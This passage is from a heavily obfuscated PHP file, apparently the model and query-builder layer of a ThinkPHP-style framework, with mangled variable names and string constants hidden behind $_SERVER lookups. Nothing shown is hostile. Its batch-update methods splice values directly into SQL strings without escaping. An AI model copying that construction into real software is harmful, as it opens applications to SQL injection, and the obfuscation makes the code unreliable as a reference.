NULL) { $„è—¶’¬ =& $_SERVER[ıÚ˜š²İ]; if ($„è—¶’¬[12] === $òÂıíİ) { if (isset($this->_scope[$„è—¶’¬[37]])) { $·ØÜ©ƒŸ = $this->_scope[$„è—¶’¬[37]]; } else { return $this; } } elseif (is_string($òÂıíİ)) { $ŒßÓŒÇô = explode($„è—¶’¬[50], $òÂıíİ); $·ØÜ©ƒŸ = array(); foreach ($ŒßÓŒÇô as $Â¦„Ÿè¿) { if (!isset($this->_scope[$Â¦„Ÿè¿])) { continue; } $·ØÜ©ƒŸ = array_merge($·ØÜ©ƒŸ, $this->_scope[$Â¦„Ÿè¿]); } if (!empty($É¬µ¯Ä¢) && is_array($É¬µ¯Ä¢)) { $·ØÜ©ƒŸ = array_merge($·ØÜ©ƒŸ, $É¬µ¯Ä¢); } } elseif (is_array($òÂıíİ)) { $·ØÜ©ƒŸ = $òÂıíİ; } if (is_array($·ØÜ©ƒŸ) && !empty($·ØÜ©ƒŸ)) { $this->options = array_merge($this->options, array_change_key_case($·ØÜ©ƒŸ)); } return $this; } public function where($Ğà“Äëú, $óœÙÂşñ = null) { $¥€ó =& $_SERVER[ıÚ˜š²İ]; if (!is_null($óœÙÂşñ) && is_string($Ğà“Äëú)) { if (!is_array($óœÙÂşñ)) { $óœÙÂşñ = func_get_args(); array_shift($óœÙÂşñ); } $óœÙÂşñ = array_map(array($this->db, $¥€ó[420]), $óœÙÂşñ); $Ğà“Äëú = vsprintf($Ğà“Äëú, $óœÙÂşñ); } elseif (is_object($Ğà“Äëú)) { $Ğà“Äëú = get_object_vars($Ğà“Äëú); } elseif (is_array($Ğà“Äëú)) { foreach ($Ğà“Äëú as $…İÔÂçö => $äÌË„§ã) { if ((is_numeric($…İÔÂçö) || !$…İÔÂçö) && is_string($äÌË„§ã)) { if (strpos($äÌË„§ã, $¥€ó[427]) === 0) { continue; } think_trace($¥€ó[428], $¥€ó[12], $¥€ó[49]); die; } } } if (is_string($Ğà“Äëú) && $¥€ó[12] != $Ğà“Äëú) { $ã£òŞ¿Ş = array(); $ã£òŞ¿Ş[$¥€ó[429]] = $Ğà“Äëú; $Ğà“Äëú = $ã£òŞ¿Ş; } if (isset($this->options[$¥€ó[355]])) { $this->options[$¥€ó[355]] = array_merge($this->options[$¥€ó[355]], $Ğà“Äëú); } else { $this->options[$¥€ó[355]] = $Ğà“Äëú; } return $this; } public function limit($Ü¹Úì‘Ó, $¾€Ë‰åÚ = null) { $ˆ­øíò´ =& $_SERVER[ıÚ˜š²İ]; $this->options[$ˆ­øíò´[370]] = is_null($¾€Ë‰åÚ) ? $Ü¹Úì‘Ó : $Ü¹Úì‘Ó . $ˆ­øíò´[50] . $¾€Ë‰åÚ; return $this; } public function page($Š†¨êü, $Í×£¼ïÌ = null) { $ôôöØ³‰ =& $_SERVER[ıÚ˜š²İ]; $this->options[$ôôöØ³‰[430]] = is_null($Í×£¼ïÌ) ? $Š†¨êü : $Š†¨êü . $ôôöØ³‰[50] . $Í×£¼ïÌ; return $this; } public function comment($‘ü€‡íã) { $this->options[$_SERVER[ıÚ˜š²İ][431]] = $‘ü€‡íã; return $this; } public function setProperty($­ıı¨—, $ı®½Òú) { if (property_exists($this, $­ıı¨—)) { $this->{$­ıı¨—} = $ı®½Òú; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\x69\x66\x79\124\151\155\x65", "\x74\x69\155\x65", "\151\x6e\163\x65\x72\164\x2c\x75\160\x64\x61\164\145", "\146\165\x6e\143\164\151\x6f\156"), array("\x63\x72\145\141\164\145\x54\x69\155\145", "\164\151\x6d\145", "\x69\x6e\163\x65\162\x74", "\x66\x75\x6e\143\164\x69\x6f\x6e")); public function setDataAuto($İ½ªß´“) { $this->dataAuto = $İ½ªß´“; } public function __construct($ã£ÁÑñ = '', $ü¥Ù¦é¿ = '', $ó ¾õúÕ = '') { parent::__construct($ã£ÁÑñ, $ü¥Ù¦é¿, $ó ¾õúÕ); } protected $tableMeta = array(); protected function _beforeInsert(&$“‘èÆâÎ, $ùëñòû¦) { $üúğäù =& $_SERVER[ıÚ˜š²İ]; if (!$this->checkDataAutoHas($üúğäù[432])) { return; } $this->dataBeforeFilter($“‘èÆâÎ, $üúğäù[432]); } protected function _beforeUpdate(&$œ¿ò›­¾, $“ØœÍ´ï) { $–”œ¡¥ =& $_SERVER[ıÚ˜š²İ]; if (!$this->checkDataAutoHas($–”œ¡¥[433])) { return; } $this->dataBeforeFilter($œ¿ò›­¾, $–”œ¡¥[433]); } protected function _afterSelect(&$î©µÔú», $¹Ëµ °‘) { if (!is_array($î©µÔú»)) { return; } if (!$this->checkDataAutoHas($_SERVER[ıÚ˜š²İ][434])) { return; } foreach ($î©µÔú» as &$‚Ëé˜ûâ) { $this->dataAfterFilter($‚Ëé˜ûâ); } unset($‚Ëé˜ûâ); } protected function _afterFind(&$úê†ÔÇ, $÷ÏÙıè) { if (!is_array($úê†ÔÇ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ıÚ˜š²İ][434])) { return; } $this->dataAfterFilter($úê†ÔÇ); } public static function textEncode($ĞÉ›½„¡) { if (!$ĞÉ›½„¡) { return $ĞÉ›½„¡; } $¬×åŒÍ = json_encode($ĞÉ›½„¡); $¬×åŒÍ = preg_replace_callback($_SERVER[ıÚ˜š²İ][435], function ($›îèÙ†ç) { return addslashes($›îèÙ†ç[0]); }, $¬×åŒÍ); return json_decode($¬×åŒÍ); } public static function textDecode($Á‹‹ÙªÆ) { $ôïÉÚÕÕ =& $_SERVER[ıÚ˜š²İ]; $ø†½ñûØ = json_encode($Á‹‹ÙªÆ); $ø†½ñûØ = preg_replace_callback($ôïÉÚÕÕ[436], function ($‘›ö©ûº) { return $_SERVER[ıÚ˜š²İ][100]; }, $ø†½ñûØ); return json_decode($ø†½ñûØ); } public function setAutoIncrement($œàÂÙ) { $å®Èú = array($this->getPk() => $œàÂÙ); $Øª¦¬Ò = $this->data($å®Èú)->add(); if ($Øª¦¬Ò) { $this->delete($Øª¦¬Ò); } } public function getAutoIncrement() { $ø‚…æ¸­ = $this->getTableName(); $éüËÊŞù = $this->max($this->getPk()); $üõ ‰ê = $this->query("\x73\150\157\x77\40\x74\141\x62\154\145\40\x73\164\141\164\165\163\40\x77\150\x65\x72\145\40\116\x61\x6d\x65\75\x27{$ø‚…æ¸­}\x27"); $êúá¿„Ì = $üõ ‰ê[0][$_SERVER[ıÚ˜š²İ][437]]; $ ©´ñ” = max($éüËÊŞù, $êúá¿„Ì); return $ ©´ñ”; } protected function _callBefore($äıÔ©, $ıÑßÖ˜Õ) { return $this->cacheCallCheck($äıÔ©, $ıÑßÖ˜Õ, !1); } protected function _callAfter($õÓ“×„, $Åê¾–) { return $this->cacheCallCheck($õÓ“×„, $Åê¾–, !0); } protected function cacheFunctionAlias($ŸØâ®ÆÜ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ï´¹‰•, $õ‘ş¤ç·, $ôÊÓÍ† = false) { $È¹ø€×Ù =& $_SERVER[ıÚ˜š²İ]; $ÑùüÔÄ = $this->cacheFunctionAlias($õ‘ş¤ç·); if (!$ÑùüÔÄ) { return; } foreach ($ÑùüÔÄ as $¯³Ê¡ => $öŸåëÈ¹) { $½’–‹õ« = $öŸåëÈ¹[0]; $™ùÆ´Œó = explode($È¹ø€×Ù[50], $öŸåëÈ¹[1]); $Âùõá¡ = isset($öŸåëÈ¹[2]) ? $öŸåëÈ¹[2] : $È¹ø€×Ù[12]; if ($ï´¹‰• == $¯³Ê¡) { return $this->cacheFunctionGet($¯³Ê¡, $½’–‹õ«, $Âùõá¡); } if ($ôÊÓÍ† && in_array($ï´¹‰•, $™ùÆ´Œó)) { $this->cacheFunctionClear($¯³Ê¡, $½’–‹õ«, $Âùõá¡); } } } public function cacheFunctionGet($Çç†º÷º, $¼ŞÛÃ÷ª, $ÄË¹…Í… = '') { $ëù‡˜¡ = $this->cacheKeyMake($Çç†º÷º, $¼ŞÛÃ÷ª, $ÄË¹…Í…); $ÈæÈè®Ì = Cache::get($ëù‡˜¡); if (!is_array($ÈæÈè®Ì)) { $ÈæÈè®Ì = call_user_func_array(array($this, $Çç†º÷º), array($¼ŞÛÃ÷ª, !0)); Cache::set($ëù‡˜¡, $ÈæÈè®Ì); } return $ÈæÈè®Ì; } public function cacheFunctionClear($ë˜Ë¾ƒ”, $ŒÌå§æ€, $ª…µ…É = '') { $äÚş¦ïÊ = $ŒÌå§æ€; if (!is_array($ŒÌå§æ€)) { $äÚş¦ïÊ = array($ŒÌå§æ€); } foreach ($äÚş¦ïÊ as $£¦êıÏù) { $Ê®°— ½ = $this->cacheKeyMake($ë˜Ë¾ƒ”, $£¦êıÏù, $ª…µ…É); Cache::remove($Ê®°— ½); } } public function cacheKeyMake($áÊ¢ –•, $›í¹Ê, $á‰Ÿ‡ÄÜ) { $÷¼ˆÙ‘Ç =& $_SERVER[ıÚ˜š²İ]; if ($á‰Ÿ‡ÄÜ) { $›í¹Ê = $›í¹Ê . $÷¼ˆÙ‘Ç[438] . $á‰Ÿ‡ÄÜ; } return get_class($this) . $÷¼ˆÙ‘Ç[11] . $áÊ¢ –• . $÷¼ˆÙ‘Ç[439] . $›í¹Ê; } protected function selectPageReset() { $‡„¦ÕˆÑ =& $_SERVER[ıÚ˜š²İ]; if (isset($GLOBALS[$‡„¦ÕˆÑ[440]])) { return; } $GLOBALS[$‡„¦ÕˆÑ[440]] = isset($GLOBALS[$‡„¦ÕˆÑ[7]][$‡„¦ÕˆÑ[441]]) ? $GLOBALS[$‡„¦ÕˆÑ[7]][$‡„¦ÕˆÑ[441]] : !1; $GLOBALS[$‡„¦ÕˆÑ[442]] = isset($GLOBALS[$‡„¦ÕˆÑ[7]][$‡„¦ÕˆÑ[430]]) ? $GLOBALS[$‡„¦ÕˆÑ[7]][$‡„¦ÕˆÑ[430]] : !1; $GLOBALS[$‡„¦ÕˆÑ[7]][$‡„¦ÕˆÑ[441]] = !1; $GLOBALS[$‡„¦ÕˆÑ[7]][$‡„¦ÕˆÑ[430]] = !1; } protected function selectPageRestore() { $åşæö¸¨ =& $_SERVER[ıÚ˜š²İ]; if (!isset($GLOBALS[$åşæö¸¨[440]])) { return; } $GLOBALS[$åşæö¸¨[7]][$åşæö¸¨[441]] = $GLOBALS[$åşæö¸¨[440]]; $GLOBALS[$åşæö¸¨[7]][$åşæö¸¨[430]] = $GLOBALS[$åşæö¸¨[442]]; if ($GLOBALS[$åşæö¸¨[7]][$åşæö¸¨[441]] === !1) { unset($GLOBALS[$åşæö¸¨[7]][$åşæö¸¨[441]]); } if ($GLOBALS[$åşæö¸¨[7]][$åşæö¸¨[430]] === !1) { unset($GLOBALS[$åşæö¸¨[7]][$åşæö¸¨[430]]); } unset($GLOBALS[$åşæö¸¨[440]]); unset($GLOBALS[$åşæö¸¨[442]]); } protected function selectPage($é­²·ÃĞ = 200, $©æ¡ã¾Ç = 1) { $ª‰Éş¤¡ =& $_SERVER[ıÚ˜š²İ]; global $in; $„‚Á‘‚ø = $this->optionsValue(); $İäŠ™µ´ = 50000; $é­²·ÃĞ = isset($in[$ª‰Éş¤¡[441]]) && $in[$ª‰Éş¤¡[441]] ? $in[$ª‰Éş¤¡[441]] : $é­²·ÃĞ; if ($é­²·ÃĞ === -1) { $in[$ª‰Éş¤¡[441]] = !1; $İäŠ™µ´ = 100000000; $é­²·ÃĞ = $İäŠ™µ´; } $ôï½¼¾ = $„‚Á‘‚ø; $ôï½¼¾[$ª‰Éş¤¡[443]] = array(); $é­²·ÃĞ = intval($é­²·ÃĞ); $é­²·ÃĞ = $é­²·ÃĞ <= 5 ? 5 : ($é­²·ÃĞ >= $İäŠ™µ´ ? $İäŠ™µ´ : $é­²·ÃĞ); $©æ¡ã¾Ç = intval(isset($in[$ª‰Éş¤¡[430]]) && $in[$ª‰Éş¤¡[430]] ? $in[$ª‰Éş¤¡[430]] : $©æ¡ã¾Ç); $©æ¡ã¾Ç = $©æ¡ã¾Ç <= 1 ? 1 : $©æ¡ã¾Ç; $ÎùÖ™¤“ = array(); $ªø‡É¿ä = 1; if ($©æ¡ã¾Ç == 1 && $ªø‡É¿ä) { $this->optionsValue($„‚Á‘‚ø); $ÎùÖ™¤“ = $this->page($©æ¡ã¾Ç, $é­²·ÃĞ)->select(); $ÙÖãÑÍ¤ = is_array($ÎùÖ™¤“) ? count($ÎùÖ™¤“) : 0; if ($ÙÖãÑÍ¤ < $é­²·ÃĞ) { $Úı¯õì = 1; } else { $this->optionsValue($ôï½¼¾); $ÙÖãÑÍ¤ = intval($this->count()); $Úı¯õì = ceil($ÙÖãÑÍ¤ / $é­²·ÃĞ); } } else { $this->optionsValue($ôï½¼¾); $ÙÖãÑÍ¤ = intval($this->count()); $Úı¯õì = ceil($ÙÖãÑÍ¤ / $é­²·ÃĞ); $©æ¡ã¾Ç = $©æ¡ã¾Ç >= $Úı¯õì ? $Úı¯õì : $©æ¡ã¾Ç; $this->optionsValue($„‚Á‘‚ø); $ÎùÖ™¤“ = $this->page($©æ¡ã¾Ç, $é­²·ÃĞ)->select(); } if (!is_array($ÎùÖ™¤“)) { $ÎùÖ™¤“ = array(); } if ($Úı¯õì == 1) { $ÙÖãÑÍ¤ = count($ÎùÖ™¤“); } $ó°ºÙÌ = array($ª‰Éş¤¡[444] => array($ª‰Éş¤¡[445] => $ÙÖãÑÍ¤, $ª‰Éş¤¡[441] => $é­²·ÃĞ, $ª‰Éş¤¡[430] => $©æ¡ã¾Ç, $ª‰Éş¤¡[446] => $Úı¯õì), $ª‰Éş¤¡[447] => $ÎùÖ™¤“); return $ó°ºÙÌ; } protected function checkLength($ôÀïù‹, $š¦ç¿İ = 0, $§ìşê“ = '') { $ª½ĞÎî =& $_SERVER[ıÚ˜š²İ]; $š¦ç¿İ = $š¦ç¿İ ? $š¦ç¿İ : 65536; if (!$ôÀïù‹ || strlen($ôÀïù‹) < $š¦ç¿İ) { return; } $§ìşê“ = $§ìşê“ ? $§ìşê“ . $ª½ĞÎî[74] : $ª½ĞÎî[12]; show_json($§ìşê“ . LNG($ª½ĞÎî[448]) . "\50{$š¦ç¿İ}\51", !1); } protected function metaSet($Ö÷Å¨ÂÅ, $îí´Ñ½´ = null, $à”ğú¶× = null) { $éÎ…¿ßš =& $_SERVER[ıÚ˜š²İ]; if (!$this->tableMeta || !$Ö÷Å¨ÂÅ) { return !1; } $ØÍÜäü = $this->tableMeta[$éÎ…¿ßš[449]]; $ôÔ‡Ú’¯ = $this->tableMeta[$éÎ…¿ßš[450]]; $•‰‹Ü«Ğ = Model($ôÔ‡Ú’¯); $­šØæ€ú = array($ØÍÜäü => $Ö÷Å¨ÂÅ, $éÎ…¿ßš[451] => $îí´Ñ½´); if (is_null($îí´Ñ½´)) { return $•‰‹Ü«Ğ->where(array($ØÍÜäü => $Ö÷Å¨ÂÅ))->delete(); } if (is_null($à”ğú¶×) && is_string($îí´Ñ½´)) { return $•‰‹Ü«Ğ->where($­šØæ€ú)->delete(); } $¹¯öÊ¥Î = is_array($îí´Ñ½´) ? $îí´Ñ½´ : array(); if (is_string($îí´Ñ½´)) { $¹¯öÊ¥Î[$îí´Ñ½´] = $à”ğú¶×; } $Şò™ôüú = array(); foreach ($¹¯öÊ¥Î as $“œ×Â²· => $¨‚Ô÷œ) { if (is_null($¨‚Ô÷œ) && is_string($“œ×Â²·)) { $•‰‹Ü«Ğ->where(array($ØÍÜäü => $Ö÷Å¨ÂÅ, $éÎ…¿ßš[451] => $“œ×Â²·))->delete(); continue; } $this->checkLength($¨‚Ô÷œ, !1, $ôÔ‡Ú’¯ . $éÎ…¿ßš[4] . $“œ×Â²·); $Şò™ôüú[] = array($ØÍÜäü => $Ö÷Å¨ÂÅ, $éÎ…¿ßš[97] => $“œ×Â²·, $éÎ…¿ßš[452] => $¨‚Ô÷œ); } $İ•¡Æİß = $éÎ…¿ßš[453] . $ôÔ‡Ú’¯; CacheLock::lock($İ•¡Æİß); $•‰‹Ü«Ğ->where(array($ØÍÜäü => $Ö÷Å¨ÂÅ))->addAll($Şò™ôüú, array(), !0); CacheLock::unlock($İ•¡Æİß); return !0; } public function metaGet($ÂäÓ°ãØ, $Óİ›€ÌØ = false) { $ÄÖà³Ç÷ =& $_SERVER[ıÚ˜š²İ]; if (!$this->tableMeta) { return array(); } $øæ¸ĞÂä = $this->tableMeta[$ÄÖà³Ç÷[449]]; $„Î½ ®Œ = Model($this->tableMeta[$ÄÖà³Ç÷[450]]); if ($Óİ›€ÌØ) { $·½ôÆÅ® = array($øæ¸ĞÂä => $ÂäÓ°ãØ, $ÄÖà³Ç÷[97] => $Óİ›€ÌØ); return $„Î½ ®Œ->where($·½ôÆÅ®)->getField($ÄÖà³Ç÷[452]); } $·½ôÆÅ® = array($øæ¸ĞÂä => $ÂäÓ°ãØ); $‘Ä”ÔË· = $„Î½ ®Œ->field($ÄÖà³Ç÷[454])->where($·½ôÆÅ®)->select(); $‘Ä”ÔË· = array_to_keyvalue($‘Ä”ÔË·, $ÄÖà³Ç÷[97], $ÄÖà³Ç÷[452]); return $‘Ä”ÔË·; } private function checkDataAutoHas($éÉÆ˜«) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $¤‡Ğ·ç) { if (in_array($éÉÆ˜«, explode($_SERVER[ıÚ˜š²İ][50], $¤‡Ğ·ç[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ÒŠâé¼ç, $Ôâ–³í°) { $üÁ¤Ï‰ =& $_SERVER[ıÚ˜š²İ]; if (!is_array($ÒŠâé¼ç)) { return; } foreach ($this->dataAuto as $¿¹İÕ©) { $¡¡Ÿ÷†€ = $¿¹İÕ©[0]; if (!in_array($Ôâ–³í°, explode($üÁ¤Ï‰[50], $¿¹İÕ©[2]))) { continue; } switch (trim($¿¹İÕ©[3])) { case $üÁ¤Ï‰[398]: case $üÁ¤Ï‰[399]: $Õº®ÛåĞ = $¿¹İÕ©[1]; $ëºõîªŞ = isset($¿¹İÕ©[4]) ? (array) $¿¹İÕ©[4] : array(); if ($Õº®ÛåĞ == $üÁ¤Ï‰[207] && array_key_exists($¡¡Ÿ÷†€, $ÒŠâé¼ç)) { if (!$ÒŠâé¼ç[$¡¡Ÿ÷†€]) { unset($ÒŠâé¼ç[$¡¡Ÿ÷†€]); } break; } if (isset($ÒŠâé¼ç[$¡¡Ÿ÷†€])) { array_unshift($ëºõîªŞ, $ÒŠâé¼ç[$¡¡Ÿ÷†€]); } if ($üÁ¤Ï‰[398] == $¿¹İÕ©[3]) { $ÒŠâé¼ç[$¡¡Ÿ÷†€] = call_user_func_array($Õº®ÛåĞ, $ëºõîªŞ); } else { $ÒŠâé¼ç[$¡¡Ÿ÷†€] = call_user_func_array(array(&$this, $Õº®ÛåĞ), $ëºõîªŞ); } break; case $üÁ¤Ï‰[350]: if (isset($ÒŠâé¼ç[$¡¡Ÿ÷†€]) && $ÒŠâé¼ç[$¡¡Ÿ÷†€]) { $ÒŠâé¼ç[$¡¡Ÿ÷†€] = call_user_func_array(array(&$this, $¿¹İÕ©[1]), array($ÒŠâé¼ç[$¡¡Ÿ÷†€])); } break; case $üÁ¤Ï‰[353]: $ÒŠâé¼ç[$¡¡Ÿ÷†€] = $ÒŠâé¼ç[$¿¹İÕ©[1]]; break; case $üÁ¤Ï‰[371]: if (isset($ÒŠâé¼ç[$¡¡Ÿ÷†€]) && !is_string($ÒŠâé¼ç[$¡¡Ÿ÷†€])) { $ÒŠâé¼ç[$¡¡Ÿ÷†€] = json_encode_force($ÒŠâé¼ç[$¡¡Ÿ÷†€]); } break; case $üÁ¤Ï‰[400]: if ($ÒŠâé¼ç[$¡¡Ÿ÷†€] === $üÁ¤Ï‰[12]) { unset($ÒŠâé¼ç[$¡¡Ÿ÷†€]); } break; case $üÁ¤Ï‰[401]: $ÒŠâé¼ç[$¡¡Ÿ÷†€] = $¿¹İÕ©[1]; default: break; } } if ($Ôâ–³í° == $üÁ¤Ï‰[432]) { $÷‹•ÑÄ = strtolower($this->db->getDbType()); if (strpos($÷‹•ÑÄ, $üÁ¤Ï‰[13]) !== 0) { return; } $©êãÁ™ = $this->field(!0)->fields; $É®ğ¯Õ = $©êãÁ™[$üÁ¤Ï‰[332]]; if (isset($©êãÁ™[$üÁ¤Ï‰[331]])) { unset($É®ğ¯Õ[$©êãÁ™[$üÁ¤Ï‰[331]]]); } foreach ($É®ğ¯Õ as $¢ÙÆ¿œÑ => $Ôâ–³í°) { if (!isset($ÒŠâé¼ç[$¢ÙÆ¿œÑ])) { $ÒŠâé¼ç[$¢ÙÆ¿œÑ] = $üÁ¤Ï‰[12]; } } } } private function dataAfterFilter(&$ÌÍâ€ì) { $¿¥æÖ¬Ã =& $_SERVER[ıÚ˜š²İ]; foreach ($this->dataAuto as $‘œ—ßˆ¢) { $‡²ÂÛºõ = $‘œ—ßˆ¢[0]; if (!isset($ÌÍâ€ì[$‡²ÂÛºõ])) { continue; } if (!in_array($¿¥æÖ¬Ã[434], explode($¿¥æÖ¬Ã[50], $‘œ—ßˆ¢[2]))) { continue; } switch (trim($‘œ—ßˆ¢[3])) { case $¿¥æÖ¬Ã[398]: case $¿¥æÖ¬Ã[399]: $µĞ‰–îğ = isset($‘œ—ßˆ¢[4]) ? (array) $‘œ—ßˆ¢[4] : array(); array_unshift($µĞ‰–îğ, $ÌÍâ€ì[$‡²ÂÛºõ]); if (isset($‘œ—ßˆ¢[4]) && $‘œ—ßˆ¢[4] == $¿¥æÖ¬Ã[455]) { $µĞ‰–îğ = array($ÌÍâ€ì[$‡²ÂÛºõ]); } if ($¿¥æÖ¬Ã[398] == $‘œ—ßˆ¢[3]) { $ÌÍâ€ì[$‡²ÂÛºõ] = call_user_func_array($‘œ—ßˆ¢[1], $µĞ‰–îğ); } else { $ÌÍâ€ì[$‡²ÂÛºõ] = call_user_func_array(array(&$this, $‘œ—ßˆ¢[1]), $µĞ‰–îğ); } break; case $¿¥æÖ¬Ã[350]: if (isset($ÌÍâ€ì[$‡²ÂÛºõ]) && $ÌÍâ€ì[$‡²ÂÛºõ]) { $ÌÍâ€ì[$‡²ÂÛºõ] = call_user_func_array(array(&$this, $‘œ—ßˆ¢[1]), array($ÌÍâ€ì[$‡²ÂÛºõ])); } break; case $¿¥æÖ¬Ã[353]: $ÌÍâ€ì[$‡²ÂÛºõ] = $ÌÍâ€ì[$‘œ—ßˆ¢[1]]; break; case $¿¥æÖ¬Ã[371]: $¶àş†ƒ = $ÌÍâ€ì[$‡²ÂÛºõ]; $ÌÍâ€ì[$‡²ÂÛºõ] = json_decode($¶àş†ƒ, !0); if (is_null($ÌÍâ€ì[$‡²ÂÛºõ])) { $ÌÍâ€ì[$‡²ÂÛºõ] = $¶àş†ƒ; } break; case $¿¥æÖ¬Ã[400]: if ($ÌÍâ€ì[$‡²ÂÛºõ] === $¿¥æÖ¬Ã[12]) { unset($ÌÍâ€ì[$‡²ÂÛºõ]); } break; case $¿¥æÖ¬Ã[401]: $ÌÍâ€ì[$‡²ÂÛºõ] = $‘œ—ßˆ¢[1]; break; default: break; } } } public function saveAll($‘›ÓŠ·‘) { $Œïâ“â =& $_SERVER[ıÚ˜š²İ]; $´²ü»¿ô = $this->tablePrefix . $this->tableName; $ÙË¦…ãİ = self::SQL_WHERE_IN_CHUNK; $‘›ÓŠ·‘ = is_array($‘›ÓŠ·‘) ? $‘›ÓŠ·‘ : array(); $ÓÈ¾Í½ = $Œïâ“â[456]; $ı˜¸ŠûÈ = 0; $”ìÏ±›¥ = array(); $–—Ñé–  = count($‘›ÓŠ·‘); for ($ê·”ü² = 0; $ê·”ü² < $–—Ñé– ; $ê·”ü²++) { $ãë³¢¬Í = $‘›ÓŠ·‘[$ê·”ü²]; if (!is_array($ãë³¢¬Í) || count($ãë³¢¬Í) != 4) { continue; } $ïç©›¹¯ = "\125\120\x44\x41\x54\105\x20\140{$´²ü»¿ô}\140\x20\123\x45\124\40{$ãë³¢¬Í[2]}\40\x3d\x20\103\x41\x53\105\40{$ãë³¢¬Í[0]}\40\xa"; if ($ı˜¸ŠûÈ == 0) { $ÓÈ¾Í½ = $ïç©›¹¯; } $”ìÏ±›¥[] = $Œïâ“â[121] . $ãë³¢¬Í[1] . $Œïâ“â[121]; $ı˜¸ŠûÈ++; $ÓÈ¾Í½ .= "\x20\x57\x48\105\116\x20\47{$ãë³¢¬Í[1]}\x27\x20\x54\110\x45\x4e\40\x27{$ãë³¢¬Í[3]}\x27\40\xa"; if ($ı˜¸ŠûÈ == $ÙË¦…ãİ || $ê·”ü² == $–—Ñé–  - 1) { $¸¡ıãˆ‡ = implode($Œïâ“â[50], $”ìÏ±›¥); $ÓÈ¾Í½ .= "\x20\x45\x4e\104\40\x20\x57\x48\x45\x52\x45\x20{$ãë³¢¬Í[0]}\40\111\x4e\x20\x28{$¸¡ıãˆ‡}\x29\x20"; $this->execute($ÓÈ¾Í½); $ı˜¸ŠûÈ = 0; $ÓÈ¾Í½ = $ïç©›¹¯; $this->chunkEventCheck(count($”ìÏ±›¥)); $”ìÏ±›¥ = array(); } } $this->chunkEventSet(); } public function saveAllEach($Ì£ÍŸÉ) { $µ³·µèÓ =& $_SERVER[ıÚ˜š²İ]; $ù÷£Ë³‹ = $this->tablePrefix . $this->tableName; foreach ($Ì£ÍŸÉ as $¬şÃ Æ¬) { if (!is_array($¬şÃ Æ¬) || count($¬şÃ Æ¬) != 4) { continue; } $‘†‚ã¨â = $¬şÃ Æ¬[0] . $µ³·µèÓ[457] . $¬şÃ Æ¬[1] . $µ³·µèÓ[121]; $ÁÀ¥×œš = $¬şÃ Æ¬[2] . $µ³·µèÓ[457] . $¬şÃ Æ¬[3] . $µ³·µèÓ[121]; $“¯‰ˆû‘ = "\x75\x70\x64\x61\x74\145\x20{$ù÷£Ë³‹}\40\x73\x65\x74\40{$ÁÀ¥×œš}\x20\x77\x68\x65\162\x65\x20{$‘†‚ã¨â}\73"; $this->execute($“¯‰ˆû‘); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($¥†¸®ù = false, $‰¹—³¤ = false) { $this->_chunkEvent = $¥†¸®ù; $this->_chunkEventParam = $‰¹—³¤; } private function chunkEventCheck($Âëš»‡¯) { if (!$this->_chunkEvent) { return; } $æ¡Ç‰Íô = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $æ¡Ç‰Íô[$_SERVER[ıÚ˜š²İ][458]] = $Âëš»‡¯; Hook::trigger($this->_chunkEvent, $æ¡Ç‰Íô); } public function addAll($¹Íö¼Ù, $ºÎ‚¼Óæ = array(), $í¦êÚ»Ş = false) { $¾ ²°ù– =& $_SERVER[ıÚ˜š²İ]; ignore_timeout(); $‹«í¯À = self::SQL_WHERE_IN_CHUNK; if (empty($¹Íö¼Ù)) { $this->error = think_lang($¾ ²°ù–[351]); return !1; } $ºÎ‚¼Óæ = $this->_parseOptions($ºÎ‚¼Óæ); foreach ($¹Íö¼Ù as $­”â¹ß => $Ò÷¶œà) { $¹Íö¼Ù[$­”â¹ß] = $this->_facade($Ò÷¶œà); $this->_beforeInsert($¹Íö¼Ù[$­”â¹ß], $ºÎ‚¼Óæ); } if (method_exists($this->db, $¾ ²°ù–[352])) { for ($­ğ’ÙÈ± = 0; $­ğ’ÙÈ± < count($¹Íö¼Ù); $­ğ’ÙÈ± += $‹«í¯À) { $ğ³¤¨ = array_slice($¹Íö¼Ù, $­ğ’ÙÈ±, $‹«í¯À); if (!is_array($ğ³¤¨) || count($ğ³¤¨) == 0) { break; } $ÏÕŸ»¿™ = $this->db->insertAll($ğ³¤¨, $ºÎ‚¼Óæ, $í¦êÚ»Ş); $this->chunkEventCheck(count($ğ³¤¨)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($¹Íö¼Ù as $­”â¹ß => $Ò÷¶œà) { $ÏÕŸ»¿™ = $this->db->insert($Ò÷¶œà, $ºÎ‚¼Óæ, $í¦êÚ»Ş); } $this->commit(); } if (!1 !== $ÏÕŸ»¿™) { $²¢äï÷ = $this->getLastInsID(); if ($²¢äï÷) { return $²¢äï÷; } } return $ÏÕŸ»¿™; } public function save($Ò¶ÊÚØ = '', $µûÖéÎú = array()) { $¯¹—‹€Å =& $_SERVER[ıÚ˜š²İ]; $ğÅ’‡ˆ = self::SQL_WHERE_IN_CHUNK; $ØÓœõ¯¿ = $this->optionsValue(); $ÚÀ®óÊ = $this->findWhereField($ØÓœõ¯¿); if (!$ÚÀ®óÊ) { return parent::save($Ò¶ÊÚØ, $µûÖéÎú); } $Èˆ¶°  = 0; $Ìõ€£ú = $ØÓœõ¯¿[$¯¹—‹€Å[355]][$ÚÀ®óÊ][1]; $Ìõ€£ú = is_array($Ìõ€£ú) ? $Ìõ€£ú : array(); $ÅÙçäÅì = count($Ìõ€£ú); for ($¦åàæñ = 0; $¦åàæñ < $ÅÙçäÅì; $¦åàæñ += $ğÅ’‡ˆ) { $µÛ Ô²’ = array_slice($Ìõ€£ú, $¦åàæñ, $ğÅ’‡ˆ); if (!is_array($µÛ Ô²’) || count($µÛ Ô²’) == 0) { break; } $ØÓœõ¯¿[$¯¹—‹€Å[355]][$ÚÀ®óÊ][1] = $µÛ Ô²’; $this->optionsValue($ØÓœõ¯¿); $Èˆ¶°  += parent::save($Ò¶ÊÚØ, $µûÖéÎú); $this->chunkEventCheck(count($µÛ Ô²’)); } $this->chunkEventSet(); return $Èˆ¶° ; } public function add($„ÛÒ‡óÚ = '', $Æ‘Ôô = array(), $š¼Ë“® = false) { if ($this->addTaskStatus && is_array($„ÛÒ‡óÚ)) { $this->addTaskData[] = 